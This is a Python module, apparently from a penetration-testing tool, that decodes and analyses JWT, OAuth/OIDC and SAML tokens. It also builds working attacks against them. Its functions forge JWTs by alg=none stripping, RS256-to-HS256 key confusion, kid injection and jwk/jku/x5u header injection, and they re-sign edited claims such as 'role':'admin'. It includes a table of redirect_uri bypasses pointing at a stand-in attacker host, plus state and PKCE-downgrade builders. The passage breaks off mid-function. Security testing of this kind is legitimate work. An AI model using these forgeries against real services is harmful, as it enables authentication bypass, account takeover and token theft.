"""Token workbench — DECODE, ANALYZE and TAMPER for JWT / OAuth / OIDC / SAML.

*** THIS MODULE IS PURE. It does no I/O, spawns nothing and reaches no daemon. ***
That is what lets the hermetic suite cover every claim below against fixtures, exactly the way
``cockpit/graphql.py`` is covered, and it is why a token analysis needs no daemon to be trusted.
A tamper produces a NEW token STRING; it never sends it. The send is the operator's, through the
repeater (approve-each, scope-checked on the wire) — this module has no path to it.

It is modelled on ``cockpit/graphql.py`` point for point, and the two tenets that module states
carry straight over:

*** RECOGNISED BY SHAPE, NOT BY PATH. ***  :func:`detect` finds a token wherever it travels — an
``Authorization: Bearer`` header, a cookie, a JSON body field, a URL parameter — by the SHAPE of
the string (three base64url segments for a JWT), never by a field name a convention suggests. A
name test would both miss real tokens (a session JWT in a cookie called ``s``) and invent fake
ones (a field literally called ``jwt`` holding an opaque id).

*** NAMES, NEVER VALUES — for the AUTO-DETECTED token. ***  :class:`TokenDetection`, which is what
travels into run records, endpoint records, API responses and onto the screen when HackPit spots
a token in captured traffic, carries the header PARAMETERS an operator attacks (``alg``/``kid``/
``jku``…), the standard registered timing claims (``exp``/``nbf``/``iat`` — non-secret by
definition) and the NAMES of every other claim — but never a claim VALUE and never the signature.
A JWT claim is routinely a secret (a session id, an email, an internal role), these models travel
everywhere, and never handing a value over cannot regress the way redacting one afterwards can.

*** …EXCEPT THE ONE THE OPERATOR PASTED. ***  When the operator pastes a token INTO the workbench
to work on it, that is their own value in a box they typed — exactly the position the repeater
body sits in — so :class:`DecodedToken` carries the full header and full claim values and the
signature. Values belong in the one place the operator put them, and nowhere else.
"""

from __future__ import annotations

import base64
import binascii
import hashlib
import hmac
import json
import re
import zlib
from typing import Any
from urllib.parse import parse_qsl, urlsplit

from pydantic import BaseModel, Field

# --------------------------------------------------------------------------- #
# base64url — JWT segments are unpadded base64url; SAML is padded base64 (+deflate)
# --------------------------------------------------------------------------- #
#: A JWT on the wire: three base64url runs joined by dots. The third (signature) is empty for an
#: ``alg=none`` token, so it is allowed to be zero-length; the first two are not.
_JWT_RE = re.compile(r"\beyJ[A-Za-z0-9_-]{2,}\.[A-Za-z0-9_-]{2,}\.[A-Za-z0-9_-]*")
#: The registered timing claims — non-secret by definition, so the detection model may carry
#: their VALUES where it carries only the NAMES of everything else.
_TIMING_CLAIMS = ("exp", "nbf", "iat")
#: HMAC algorithms whose secret a wordlist can recover — the crackable set.
_HMAC_ALGS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def b64url_decode(segment: str) -> bytes:
    """Decode one base64url segment, restoring the padding a JWT strips. NEVER raises — a segment
    that will not decode comes back ``b""`` so a malformed token still yields a partial view."""
    s = str(segment or "")
    pad = "=" * (-len(s) % 4)
    try:
        return base64.urlsafe_b64decode(s + pad)
    except (binascii.Error, ValueError):
        return b""


def b64url_encode(raw: bytes) -> str:
    """Encode to unpadded base64url — the shape a JWT segment takes on the wire."""
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def _json_or_none(raw: bytes) -> Any:
    try:
        return json.loads(raw.decode("utf-8"))
    except (ValueError, UnicodeDecodeError):
        return None


# --------------------------------------------------------------------------- #
# JWT — decode / analyze (the operator's pasted token: full values)
# --------------------------------------------------------------------------- #
class TokenVerdict(BaseModel):
    """One flagged property of a token — a classic misconfiguration worth an operator's eye."""

    id: str = Field(..., description="accept-none | missing-exp | weak-secret-crackable | "
                    "kid-injectable | jku-injectable | jwk-injectable | x5u-injectable | expired")
    severity: str = Field("info", description="high | medium | low | info — advisory only.")
    detail: str = ""


class DecodedToken(BaseModel):
    """A JWT the OPERATOR PASTED, decoded in full. Values belong here — it is a box they typed.

    ``header`` and ``claims`` carry full values; ``signature`` is the raw third segment. This is
    the workbench working on the operator's own token, exactly the position the repeater body
    sits in. The AUTO-DETECTED model :class:`TokenDetection` is the value-free one.
    """

    kind: str = Field("jwt", description="Always 'jwt' here — the pasted-token decoder.")
    valid_structure: bool = Field(False, description="Three dot-separated segments that decoded.")
    header: dict[str, Any] = Field(default_factory=dict)
    claims: dict[str, Any] = Field(default_factory=dict)
    alg: str = ""
    kid: str = ""
    typ: str = ""
    jku: str = ""
    x5u: str = ""
    jwk_present: bool = False
    signature: str = Field("", description="The raw third segment, base64url — empty for alg=none.")
    signing_input: str = Field("", description="`header.payload` — what a signature is computed over.")
    verdicts: list[TokenVerdict] = Field(default_factory=list)
    note: str = Field("", description="Why a token that looked like a JWT could not be decoded.")


def decode_jwt(token: str) -> DecodedToken:
    """A pasted JWT -> its header, claims and signature. NEVER raises.

    A token that does not split into three, or whose header/payload is not JSON, comes back with
    ``valid_structure=False`` and a ``note`` — never an exception, because this runs on whatever
    an operator pasted, and a typo must produce a message rather than a stack trace.
    """
    out = DecodedToken()
    raw = str(token or "").strip()
    if not raw:
        out.note = "no token pasted"
        return out
    parts = raw.split(".")
    if len(parts) != 3:
        out.note = (f"a JWT has three dot-separated segments; this has {len(parts)}. "
                    "If it is opaque (not a JWT), there is nothing to decode.")
        return out
    header = _json_or_none(b64url_decode(parts[0]))
    payload = _json_or_none(b64url_decode(parts[1]))
    if not isinstance(header, dict):
        out.note = "the first segment is not a JSON object — not a JWT header"
        return out
    out.valid_structure = isinstance(payload, dict)
    out.header = header
    out.claims = payload if isinstance(payload, dict) else {}
    out.signature = parts[2]
    out.signing_input = f"{parts[0]}.{parts[1]}"
    out.alg = str(header.get("alg", "") or "")
    out.kid = str(header.get("kid", "") or "")
    out.typ = str(header.get("typ", "") or "")
    out.jku = str(header.get("jku", "") or "")
    out.x5u = str(header.get("x5u", "") or "")
    out.jwk_present = "jwk" in header
    if not out.valid_structure and not out.note:
        out.note = "the header decoded but the payload is not a JSON object"
    out.verdicts = analyze_jwt(out)
    return out


def analyze_jwt(decoded: DecodedToken) -> list[TokenVerdict]:
    """The classic JWT misconfigurations, from the decoded token. Flags, never a refusal."""
    v: list[TokenVerdict] = []
    alg = decoded.alg.lower()
    if alg in ("none", ""):
        v.append(TokenVerdict(
            id="accept-none", severity="high",
            detail="alg is 'none' — if the server honours it, the signature is not checked at all."))
    if alg.startswith("hs"):
        v.append(TokenVerdict(
            id="weak-secret-crackable", severity="medium",
            detail=f"{decoded.alg or 'HS*'} is symmetric — a weak signing secret is recoverable "
                   "offline (hashcat -m 16500). Try the gated crack."))
    if "exp" not in decoded.claims:
        v.append(TokenVerdict(
            id="missing-exp", severity="low",
            detail="no exp claim — the token does not expire on its own."))
    if decoded.kid:
        v.append(TokenVerdict(
            id="kid-injectable", severity="medium",
            detail="a kid header selects a key file/row server-side — a path-traversal, SQLi or "
                   "command payload here can pick an attacker-controlled key."))
    if decoded.jku:
        v.append(TokenVerdict(
            id="jku-injectable", severity="medium",
            detail="jku points the server at a JWKS URL — if it is not pinned, host the key "
                   "yourself (pairs with the OOB/canary surface for the fetch)."))
    if decoded.jwk_present:
        v.append(TokenVerdict(
            id="jwk-injectable", severity="medium",
            detail="an embedded jwk — some libraries verify against the key IN the token."))
    if decoded.x5u:
        v.append(TokenVerdict(
            id="x5u-injectable", severity="medium",
            detail="x5u points at an X.509 cert URL — same class as jku."))
    return v


# --------------------------------------------------------------------------- #
# JWT — tamper primitives (produce a NEW token string; send nothing)
# --------------------------------------------------------------------------- #
class TamperResult(BaseModel):
    """A mutated token, ready for the operator to send via the repeater. It IS a value the
    operator asked for — the box they typed — so the token string is populated in full."""

    token: str = Field("", description="The mutated token, or empty when it could not be built.")
    kind: str = Field("", description="Which tamper produced it.")
    note: str = Field("", description="What changed, and any caveat.")
    ok: bool = Field(False, description="True when a token was produced.")


def _encode_jwt(header: dict[str, Any], payload: dict[str, Any], signature_b64: str) -> str:
    h = b64url_encode(json.dumps(header, separators=(",", ":"), sort_keys=False).encode("utf-8"))
    p = b64url_encode(json.dumps(payload, separators=(",", ":"), sort_keys=False).encode("utf-8"))
    return f"{h}.{p}.{signature_b64}"


def _hmac_sign(signing_input: str, secret: bytes, alg: str) -> str:
    algo = _HMAC_ALGS.get(alg.upper(), hashlib.sha256)
    return b64url_encode(hmac.new(secret, signing_input.encode("utf-8"), algo).digest())


def tamper_alg_none(decoded: DecodedToken, variant: str = "none") -> TamperResult:
    """Strip the signature: set ``alg`` to a none-variant and emit a token with an EMPTY third
    segment. The case variants (``none``/``None``/``nOnE``/``NONE``) exist because some libraries
    lower-case the alg before comparing and others do not — a case-blind check is the bug."""
    if not decoded.header:
        return TamperResult(kind="alg-none", note="decode a token first")
    header = dict(decoded.header)
    header["alg"] = variant
    token = _encode_jwt(header, decoded.claims, "")
    return TamperResult(
        token=token, kind="alg-none", ok=True,
        note=f"alg set to {variant!r}, signature stripped. If the server honours alg=none, this "
             "is accepted unsigned — edit any claim and send it.")


def tamper_alg_confusion(decoded: DecodedToken, public_key_pem: str,
                         alg: str = "HS256") -> TamperResult:
    """RS256 -> HS256 confusion: sign with the server's PUBLIC key as the HMAC secret.

    A server that verifies RS256 with a public key, but whose library picks the algorithm from
    the TOKEN, can be handed an HS256 token signed with that same public key — which the operator
    has, because it is public. The PEM the operator pastes IS the HMAC secret, byte for byte."""
    pem = (public_key_pem or "").encode("utf-8")
    if not pem.strip():
        return TamperResult(kind="alg-confusion",
                            note="paste the server's PUBLIC key (PEM) — it becomes the HMAC secret")
    if not decoded.header:
        return TamperResult(kind="alg-confusion", note="decode a token first")
    header = dict(decoded.header)
    header["alg"] = alg
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    p = b64url_encode(json.dumps(decoded.claims, separators=(",", ":")).encode("utf-8"))
    signing_input = f"{h}.{p}"
    sig = _hmac_sign(signing_input, pem, alg)
    return TamperResult(
        token=f"{signing_input}.{sig}", kind="alg-confusion", ok=True,
        note=f"alg forced to {alg}; signed with the pasted public key as the HMAC secret "
             "(RS256->HS256 key confusion).")


def tamper_kid_injection(decoded: DecodedToken, payload: str,
                         sign_secret: str = "") -> TamperResult:
    """Put an injection payload in the ``kid`` header — path traversal (``../../dev/null``), SQLi
    or command — to steer a server's key lookup. When the traversal selects a KNOWN file (e.g.
    ``/dev/null`` -> empty key), re-sign with ``sign_secret`` (blank = empty key) so the forged
    token verifies against the file the kid now points at."""
    if not decoded.header:
        return TamperResult(kind="kid-injection", note="decode a token first")
    header = dict(decoded.header)
    header["kid"] = payload
    header.setdefault("alg", "HS256")
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    p = b64url_encode(json.dumps(decoded.claims, separators=(",", ":")).encode("utf-8"))
    signing_input = f"{h}.{p}"
    sig = _hmac_sign(signing_input, (sign_secret or "").encode("utf-8"),
                     str(header.get("alg", "HS256")))
    return TamperResult(
        token=f"{signing_input}.{sig}", kind="kid-injection", ok=True,
        note=f"kid set to {payload!r}; re-signed HMAC with "
             f"{'the empty key' if not sign_secret else 'the supplied key'} — matches a kid that "
             "resolves to that key file.")


def tamper_header_injection(decoded: DecodedToken, field: str, value: str,
                            sign_secret: str = "") -> TamperResult:
    """Inject a ``jwk`` / ``jku`` / ``x5u`` header pointing at (or embedding) an attacker key.

    ``jwk`` takes a JSON key object (embedded key — some libraries verify against it); ``jku`` /
    ``x5u`` take a URL the operator controls (pairs with the OOB/canary surface for the fetch).
    Re-signs HMAC with ``sign_secret`` so an embedded-key path that HMACs the jwk verifies."""
    field = (field or "").strip().lower()
    if field not in ("jwk", "jku", "x5u"):
        return TamperResult(kind="header-injection",
                            note="field must be one of jwk, jku, x5u")
    if not decoded.header:
        return TamperResult(kind="header-injection", note="decode a token first")
    header = dict(decoded.header)
    if field == "jwk":
        parsed = _json_or_none(value.encode("utf-8")) if value else None
        header["jwk"] = parsed if parsed is not None else value
    else:
        header[field] = value
    header.setdefault("alg", "HS256")
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    p = b64url_encode(json.dumps(decoded.claims, separators=(",", ":")).encode("utf-8"))
    signing_input = f"{h}.{p}"
    sig = _hmac_sign(signing_input, (sign_secret or "").encode("utf-8"),
                     str(header.get("alg", "HS256")))
    return TamperResult(
        token=f"{signing_input}.{sig}", kind=f"{field}-injection", ok=True,
        note=f"{field} header set; re-signed HMAC. Point the server at your key and it verifies "
             "the token you signed.")


def resign_hs(decoded: DecodedToken, secret: str, alg: str = "") -> TamperResult:
    """Re-sign the (possibly edited) claims with a KNOWN secret — the recovered weak key, or one
    the operator supplies. This is the second half of the crack: recover the secret, then forge."""
    if not decoded.header:
        return TamperResult(kind="resign", note="decode a token first")
    header = dict(decoded.header)
    use_alg = (alg or header.get("alg") or "HS256")
    if use_alg.upper() not in _HMAC_ALGS:
        use_alg = "HS256"
    header["alg"] = use_alg
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    p = b64url_encode(json.dumps(decoded.claims, separators=(",", ":")).encode("utf-8"))
    signing_input = f"{h}.{p}"
    sig = _hmac_sign(signing_input, (secret or "").encode("utf-8"), use_alg)
    return TamperResult(
        token=f"{signing_input}.{sig}", kind="resign", ok=True,
        note=f"re-signed {use_alg} with the supplied secret — a valid token for any claims you set.")


def edit_and_resign(token: str, claims_json: str, secret: str = "",
                    alg: str = "") -> TamperResult:
    """Decode ``token``, replace its claims with ``claims_json``, and re-sign with ``secret``.

    This is the workbench's edit path: the operator changes ``"role":"user"`` to ``"admin"`` in
    the box and gets a token that carries it. ``secret`` blank + ``alg`` none-variant produces an
    unsigned token; a real secret produces a validly-signed one."""
    decoded = decode_jwt(token)
    if not decoded.header:
        return TamperResult(kind="edit", note=decoded.note or "could not decode the token")
    parsed = _json_or_none((claims_json or "").encode("utf-8"))
    if not isinstance(parsed, dict):
        return TamperResult(kind="edit",
                            note="claims must be a JSON object — nothing was built rather than a "
                                 "body you did not write")
    decoded.claims = parsed
    use_alg = (alg or decoded.alg or "HS256")
    if use_alg.lower() in ("none", ""):
        return tamper_alg_none(decoded, use_alg or "none")
    return resign_hs(decoded, secret, use_alg)


# --------------------------------------------------------------------------- #
# JWT — detection (auto, over captured traffic): NAMES, never VALUES
# --------------------------------------------------------------------------- #
class TokenDetection(BaseModel):
    """A token FOUND in captured traffic. NO claim value, NO signature — see the module docstring.

    Carries the header parameters an operator attacks and the registered timing claims (which are
    non-secret), plus the NAMES of every other claim. A secret in a claim value cannot reach this
    model, the same rule ``GraphQLArgument`` follows for an argument that is routinely a token.
    """

    found: bool = False
    kind: str = Field("", description="jwt — the only structured token type recognised here.")
    where: str = Field("", description="authorization | cookie | body | query_param — WHERE it "
                       "travelled, so an operator can find it again.")
    alg: str = ""
    kid: str = ""
    typ: str = ""
    jku_present: bool = False
    jwk_present: bool = False
    x5u_present: bool = False
    exp: int | None = Field(None, description="Registered timing claim — non-secret, so its VALUE "
                            "is carried where every other claim carries only its NAME.")
    nbf: int | None = None
    iat: int | None = None
    claim_names: list[str] = Field(default_factory=list,
                                   description="NAMES only. A claim value is routinely a secret.")
    verdicts: list[TokenVerdict] = Field(default_factory=list)
    note: str = ""


def _timing(claims: dict[str, Any], name: str) -> int | None:
    val = claims.get(name)
    return int(val) if isinstance(val, (int, float)) else None


def _detection_from_jwt(raw: str, where: str) -> TokenDetection | None:
    parts = str(raw or "").split(".")
    if len(parts) != 3:
        return None
    header = _json_or_none(b64url_decode(parts[0]))
    payload = _json_or_none(b64url_decode(parts[1]))
    if not isinstance(header, dict):
        return None
    claims = payload if isinstance(payload, dict) else {}
    # Build a value-free decoded view purely to reuse analyze_jwt for the verdicts. The verdicts
    # carry no claim values, so this stays value-free.
    view = DecodedToken(
        valid_structure=isinstance(payload, dict), header=header, claims=claims,
        alg=str(header.get("alg", "") or ""), kid=str(header.get("kid", "") or ""),
        typ=str(header.get("typ", "") or ""), jku=str(header.get("jku", "") or ""),
        x5u=str(header.get("x5u", "") or ""), jwk_present="jwk" in header,
        signature=parts[2], signing_input=f"{parts[0]}.{parts[1]}")
    return TokenDetection(
        found=True, kind="jwt", where=where,
        alg=view.alg, kid=view.kid, typ=view.typ,
        jku_present=bool(view.jku), jwk_present=view.jwk_present, x5u_present=bool(view.x5u),
        exp=_timing(claims, "exp"), nbf=_timing(claims, "nbf"), iat=_timing(claims, "iat"),
        claim_names=[str(k) for k in claims.keys()],
        verdicts=analyze_jwt(view),
        note="" if isinstance(payload, dict) else "header decoded; payload is not a JSON object")


def _header_value(headers: Any, name: str) -> str:
    want = name.lower()
    for h in headers or ():
        hn = getattr(h, "name", None)
        hv = getattr(h, "value", None)
        if hn is None and isinstance(h, (tuple, list)) and len(h) == 2:
            hn, hv = h
        if str(hn or "").lower() == want:
            return str(hv or "")
    return ""


def detect(method: str = "GET", url: str = "", headers: Any = (), body: str = "") -> TokenDetection:
    """Find a JWT in a request, BY SHAPE, wherever it travels. NEVER raises.

    Looks, in order, at ``Authorization: Bearer``, the ``Cookie`` header, the URL query, and the
    body — and reports the FIRST JWT-shaped string it finds along with where it was. A request
    with no token comes back ``found=False`` rather than propagating, because this runs over every
    row of a capture and one malformed message must not empty a filter.
    """
    # 1. Authorization: Bearer <jwt>
    auth = _header_value(headers, "authorization")
    m = re.search(r"bearer\s+(\S+)", auth, re.IGNORECASE)
    if m:
        det = _detection_from_jwt(m.group(1), "authorization")
        if det:
            return det

    # 2. Cookie header — any cookie value that is JWT-shaped.
    cookie = _header_value(headers, "cookie")
    for hit in _JWT_RE.findall(cookie):
        det = _detection_from_jwt(hit, "cookie")
        if det:
            return det

    # 3. URL query parameters.
    if "?" in str(url or ""):
        for _k, v in parse_qsl(urlsplit(str(url)).query):
            for hit in _JWT_RE.findall(v):
                det = _detection_from_jwt(hit, "query_param")
                if det:
                    return det

    # 4. Body — a JWT anywhere in it (JSON field, form field, raw).
    for hit in _JWT_RE.findall(str(body or "")):
        det = _detection_from_jwt(hit, "body")
        if det:
            return det

    return TokenDetection(found=False)


def detect_exchange(exchange: Any) -> TokenDetection:
    """:func:`detect` for a ``CapturedExchange``/``RepeaterExchange``-shaped object."""
    try:
        req = exchange.request
        return detect(req.method, req.url, req.headers, req.body)
    except Exception:  # noqa: BLE001 - a detector must never break a capture read
        return TokenDetection(found=False)


# --------------------------------------------------------------------------- #
# OAuth / OIDC — parse an authorization request/callback, build the attack variants
# --------------------------------------------------------------------------- #
#: The open-redirect bypass table, reused from the offensive KB. Each entry is a way to make a
#: redirect_uri that an allow-list check waves through but a browser sends elsewhere. `{evil}` is
#: the attacker origin, `{host}` the legitimate one.
REDIRECT_BYPASSES: tuple[tuple[str, str], ...] = (
    ("subdomain", "https://{host}.{evil}/cb"),
    ("path-append", "{orig}/../{evil}"),
    ("at-confusion", "https://{host}@{evil}/cb"),
    ("at-userinfo", "https://{evil}\\@{host}/cb"),
    ("backslash", "https://{evil}\\.{host}/cb"),
    ("open-redirect-param", "{orig}?redirect=https://{evil}"),
    ("data-uri", "data://{host}/cb#@{evil}"),
    ("localhost-swap", "https://{evil}/{host}/cb"),
    ("null-byte", "https://{host}%00.{evil}/cb"),
    ("trailing-dot", "https://{evil}/cb#https://{host}"),
)


class OAuthRequest(BaseModel):
    """A parsed OAuth 2.0 / OIDC authorization request or callback. Structure only.

    These fields are protocol PARAMETERS of a request the operator pasted — not a secret store —
    so their values are carried, exactly as the repeater carries the URL the operator typed. The
    one value never worth trusting, ``code``/``access_token`` on a callback, is reported by NAME.
    """

    endpoint: str = Field("", description="The authorize endpoint (scheme://host/path).")
    client_id: str = ""
    redirect_uri: str = ""
    response_type: str = ""
    response_mode: str = ""
    scope: str = ""
    state: str = ""
    nonce: str = ""
    code_challenge: str = ""
    code_challenge_method: str = ""
    has_pkce: bool = False
    is_callback: bool = Field(False, description="Carries code / token / id_token — a response.")
    callback_params: list[str] = Field(default_factory=list,
                                        description="NAMES of credential-bearing callback params.")
    other_params: list[str] = Field(default_factory=list)
    verdicts: list[TokenVerdict] = Field(default_factory=list)
    note: str = ""


_CALLBACK_KEYS = ("code", "access_token", "token", "id_token")


def parse_oauth(url_or_query: str) -> OAuthRequest:
    """An authorization request/callback URL (or bare query string) -> its parameters. NEVER raises."""
    out = OAuthRequest()
    raw = str(url_or_query or "").strip()
    if not raw:
        out.note = "nothing to parse"
        return out
    split = urlsplit(raw)
    if split.scheme and split.netloc:
        out.endpoint = f"{split.scheme}://{split.netloc}{split.path}"
    query = split.query or (raw if "=" in raw and "://" not in raw else "")
    # A fragment-mode callback carries its params after '#'.
    frag = split.fragment
    params = dict(parse_qsl(query, keep_blank_values=True))
    if frag and "=" in frag:
        params.update(dict(parse_qsl(frag, keep_blank_values=True)))
    if not params:
        out.note = "no query parameters found — paste the full authorize URL or its query string"
        return out

    out.client_id = params.get("client_id", "")
    out.redirect_uri = params.get("redirect_uri", "")
    out.response_type = params.get("response_type", "")
    out.response_mode = params.get("response_mode", "")
    out.scope = params.get("scope", "")
    out.state = params.get("state", "")
    out.nonce = params.get("nonce", "")
    out.code_challenge = params.get("code_challenge", "")
    out.code_challenge_method = params.get("code_challenge_method", "")
    out.has_pkce = bool(out.code_challenge)
    known = {"client_id", "redirect_uri", "response_type", "response_mode", "scope", "state",
             "nonce", "code_challenge", "code_challenge_method"}
    out.callback_params = [k for k in params if k in _CALLBACK_KEYS]
    out.is_callback = bool(out.callback_params)
    out.other_params = [k for k in params if k not in known and k not in _CALLBACK_KEYS]
    out.verdicts = analyze_oauth(out)
    return out


def analyze_oauth(req: OAuthRequest) -> list[TokenVerdict]:
    """OAuth/OIDC misconfigurations worth an operator's eye. Flags, never a refusal."""
    v: list[TokenVerdict] = []
    if not req.is_callback:
        if not req.state:
            v.append(TokenVerdict(id="missing-state", severity="medium",
                     detail="no state parameter — the callback has no CSRF binding to try to forge."))
        rt = req.response_type.lower()
        if "token" in rt and "code" not in rt:
            v.append(TokenVerdict(id="implicit-flow", severity="medium",
                     detail="response_type carries a token (implicit flow) — the access token "
                            "lands in the URL fragment, leakable via referer/history."))
        if req.response_type and not req.has_pkce and "code" in rt:
            v.append(TokenVerdict(id="no-pkce", severity="low",
                     detail="an auth-code flow with no PKCE — a stolen code is not bound to a "
                            "verifier. Try dropping code_challenge on a public client."))
    return v


class OAuthBuild(BaseModel):
    """A mutated authorization request, ready for the repeater."""

    url: str = ""
    attack: str = ""
    note: str = ""
    ok: bool = False


def _rebuild(endpoint: str, params: dict[str, str]) -> str:
    from urllib.parse import urlencode

    query = urlencode({k: v for k, v in params.items() if v is not None}, safe="/:@")
    return f"{endpoint}?{query}" if endpoint else f"?{query}"


def _oauth_params(req: OAuthRequest) -> dict[str, str]:
    out: dict[str, str] = {}
    for key, val in (("client_id", req.client_id), ("redirect_uri", req.redirect_uri),
                     ("response_type", req.response_type), ("response_mode", req.response_mode),
                     ("scope", req.scope), ("state", req.state), ("nonce", req.nonce),
                     ("code_challenge", req.code_challenge),
                     ("code_challenge_method", req.code_challenge_method)):
        if val:
            out[key] = val
    return out


def build_oauth_attack(req: OAuthRequest, attack: str, evil_host: str = "evil.example",
                       response_mode: str = "form_post") -> OAuthBuild:
    """Produce the mutated authorization URL for one OAuth attack. Sends nothing.

    ``redirect_uri`` returns a MULTI-LINE list (one bypass per line) because there is no single
    right mutation — the allow-list decides which slips through, and the operator sends each.
    """
    attack = (attack or "").strip().lower()
    params = _oauth_params(req)
    if attack == "redirect_uri":
        host = urlsplit(req.redirect_uri).netloc or urlsplit(req.endpoint).netloc or "target"
        orig = req.redirect_uri or f"https://{host}/cb"
        lines = []
        for name, tmpl in REDIRECT_BYPASSES:
            mutated = tmpl.format(evil=evil_host, host=host, orig=orig)
            p = dict(params)
            p["redirect_uri"] = mutated
            lines.append(f"# {name}\n{_rebuild(req.endpoint, p)}")
        return OAuthBuild(url="\n".join(lines), attack="redirect_uri", ok=bool(lines),
                          note="one redirect_uri bypass per line — send each; the allow-list "
                               "decides which the server follows. Reuses the open-redirect table.")
    if attack == "drop_state":
        params.pop("state", None)
        return OAuthBuild(url=_rebuild(req.endpoint, params), attack="drop_state", ok=True,
                          note="state removed — if the callback is accepted without it, the flow "
                               "has no CSRF binding (login-CSRF / account-linking).")
    if attack == "pkce_downgrade":
        params.pop("code_challenge", None)
        params.pop("code_challenge_method", None)
        return OAuthBuild(url=_rebuild(req.endpoint, params), attack="pkce_downgrade", ok=True,
                          note="code_challenge dropped — if the server still issues a code, PKCE "
                               "is not enforced and a stolen code is replayable.")
    if attack == "response_mode":
        params["response_mode"] = response_mode
        return OAuthBuild(url=_rebuild(req.endpoint, params), attack="response_mode", ok=True,
                          note=f"response_mode forced to {response_mode} — form_post/web_message "
                               "change where the token is delivered (postMessage origin tricks).")
    if attack == "implicit_leak":
        params["response_type"] = "token"
        params.pop("code_challenge", None)
        params.pop("code_challenge_method", None)
        return OAuthBuild(url=_rebuild(req.endpoint, params), attack="implicit_leak", ok=True,
                          note="response_type=token — if implicit is allowed, the access token "
                               "comes back in the fragment, leakable via referer/history.")
    return OAuthBuild(attack=attack, note="unknown attack — one of redirect_uri, drop_state, "
                      "pkce_downgrade, response_mode, implicit_leak")


# --------------------------------------------------------------------------- #
# SAML — parse a Response/Assertion, build the XSW / stripping / comment attacks
# --------------------------------------------------------------------------- #
class SAMLAnalysis(BaseModel):
    """A parsed SAML Response/Assertion. The operator pasted it — structure and values are theirs."""

    valid_xml: bool = False
    issuer: str = ""
    destination: str = ""
    subject_name_id: str = ""
    not_before: str = ""
    not_on_or_after: str = ""
    audience: str = ""
    response_signed: bool = Field(False, description="A Signature is a direct child of Response.")
    assertion_signed: bool = Field(False, description="A Signature is a direct child of Assertion.")
    assertion_count: int = 0
    was_deflated: bool = Field(False, description="Redirect-binding (base64+DEFLATE), not POST.")
    verdicts: list[TokenVerdict] = Field(default_factory=list)
    xml: str = Field("", description="The decoded XML, so a tamper can operate on it.")
    note: str = ""


def decode_saml(blob: str) -> tuple[str, bool]:
    """A SAML blob -> (xml, was_deflated). Handles POST binding (base64) and Redirect binding
    (base64 + raw-DEFLATE). NEVER raises: a blob that is already XML is returned as-is."""
    raw = str(blob or "").strip()
    if not raw:
        return "", False
    if raw.lstrip().startswith("<"):
        return raw, False
    try:
        decoded = base64.b64decode(raw + "=" * (-len(raw) % 4))
    except (binascii.Error, ValueError):
        return raw, False
    # Redirect binding raw-DEFLATEs before base64. Try inflate; fall back to plain.
    try:
        inflated = zlib.decompress(decoded, -15)
        return inflated.decode("utf-8", "replace"), True
    except (zlib.error, UnicodeDecodeError):
        return decoded.decode("utf-8", "replace"), False


def encode_saml(xml: str, deflate: bool = False) -> str:
    """XML -> the wire blob. POST binding is base64; Redirect binding raw-DEFLATEs first."""
    data = str(xml or "").encode("utf-8")
    if deflate:
        comp = zlib.compressobj(9, zlib.DEFLATED, -15)
        data = comp.compress(data) + comp.flush()
    return base64.b64encode(data).decode("ascii")


def _first(pattern: str, text: str) -> str:
    m = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
    return (m.group(1) if m and m.groups() else "").strip()


def _localname(tag: str) -> str:
    return tag.split(":")[-1]


def _direct_child_signature(xml: str, parent_local: str) -> bool:
    """Is there a <ds:Signature> that is a DIRECT child of the first <parent_local ...>?

    Direct-child rather than descendant matters: a signature buried inside the Assertion does not
    make the RESPONSE signed, and confusing the two is the whole point of a wrapping attack. This
    walks the opening tag's immediate children by depth, not a naive substring test.
    """
    m = re.search(rf"<([A-Za-z0-9]+:)?{parent_local}\b", xml, re.IGNORECASE)
    if not m:
        return False
    start = m.end()
    depth = 0
    for tok in re.finditer(r"<(/?)([A-Za-z0-9]+:)?([A-Za-z0-9]+)\b[^>]*?(/?)>", xml[start:]):
        closing, _pfx, local, selfclose = tok.groups()
        if closing:
            if depth == 0:
                break
            depth -= 1
            continue
        if depth == 0 and _localname(local) == "Signature":
            return True
        if not selfclose:
            depth += 1
    return False


def parse_saml(blob: str) -> SAMLAnalysis:
    """A SAML Response/Assertion (base64[+deflate] or raw XML) -> its structure. NEVER raises."""
    out = SAMLAnalysis()
    xml, deflated = decode_saml(blob)
    out.was_deflated = deflated
    out.xml = xml
    if not xml.strip():
        out.note = "nothing to parse"
        return out
    if "<" not in xml or "saml" not in xml.lower() and "Assertion" not in xml:
        out.note = "this does not look like SAML — no saml namespace or <Assertion> element"
        return out
    out.valid_xml = bool(re.search(r"<([A-Za-z0-9]+:)?(Response|Assertion)\b", xml, re.IGNORECASE))
    out.issuer = _first(r"<(?:[A-Za-z0-9]+:)?Issuer[^>]*>(.*?)</(?:[A-Za-z0-9]+:)?Issuer>", xml)
    out.destination = _first(r'\bDestination="([^"]*)"', xml)
    out.subject_name_id = _first(
        r"<(?:[A-Za-z0-9]+:)?NameID[^>]*>(.*?)</(?:[A-Za-z0-9]+:)?NameID>", xml)
    out.not_before = _first(r'\bNotBefore="([^"]*)"', xml)
    out.not_on_or_after = _first(r'\bNotOnOrAfter="([^"]*)"', xml)
    out.audience = _first(
        r"<(?:[A-Za-z0-9]+:)?Audience[^>]*>(.*?)</(?:[A-Za-z0-9]+:)?Audience>", xml)
    out.assertion_count = len(re.findall(r"<(?:[A-Za-z0-9]+:)?Assertion\b", xml, re.IGNORECASE))
    out.response_signed = _direct_child_signature(xml, "Response")
    out.assertion_signed = _direct_child_signature(xml, "Assertion")
    out.verdicts = analyze_saml(out)
    return out


def analyze_saml(a: SAMLAnalysis) -> list[TokenVerdict]:
    v: list[TokenVerdict] = []
    if a.valid_xml and not a.assertion_signed and not a.response_signed:
        v.append(TokenVerdict(id="unsigned", severity="high",
                 detail="no signature on the Response OR the Assertion — if the SP accepts it, "
                        "forge any assertion you like."))
    elif a.response_signed and not a.assertion_signed:
        v.append(TokenVerdict(id="response-only-signed", severity="medium",
                 detail="only the Response is signed, not the Assertion — the classic XSW target: "
                        "wrap a forged unsigned assertion around the signed one."))
    if a.subject_name_id and "@" in a.subject_name_id:
